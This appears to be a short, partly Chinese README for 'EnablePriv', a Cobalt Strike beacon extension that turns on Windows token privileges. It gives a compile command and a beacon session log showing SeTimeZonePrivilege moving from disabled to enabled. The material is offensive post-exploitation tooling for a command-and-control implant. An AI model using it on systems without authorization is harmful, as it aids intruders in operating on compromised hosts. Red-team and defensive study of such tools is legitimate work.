> getprivs可以启用大部分，这个可能有时候会用到吧。

## Compile

```
cl.exe /c /GS- entry.c /FoEnablePriv.o
```

## Usage

```
beacon> shell whoami /priv
[*] Tasked beacon to run: whoami /priv
[+] host called home, sent: 43 bytes
[+] received output:

特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeShutdownPrivilege           关闭系统             已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeUndockPrivilege             从扩展坞上取下计算机 已禁用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
SeTimeZonePrivilege           更改时区             已禁用

beacon> EnablePriv SeTimeZonePrivilege
[+] host called home, sent: 1541 bytes
[+] received output:
Enable SeTimeZonePrivilege
[+] received output:
OpenProcessToken Success
[+] received output:
LookupPrivilegeValue Success
[+] received output:
AdjustTokenPrivileges Success
[+] received output:
Enable SeTimeZonePrivilege Success
beacon> shell whoami /priv
[*] Tasked beacon to run: whoami /priv
[+] host called home, sent: 43 bytes
[+] received output:

特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeShutdownPrivilege           关闭系统             已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeUndockPrivilege             从扩展坞上取下计算机 已禁用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
SeTimeZonePrivilege           更改时区             已启用

```
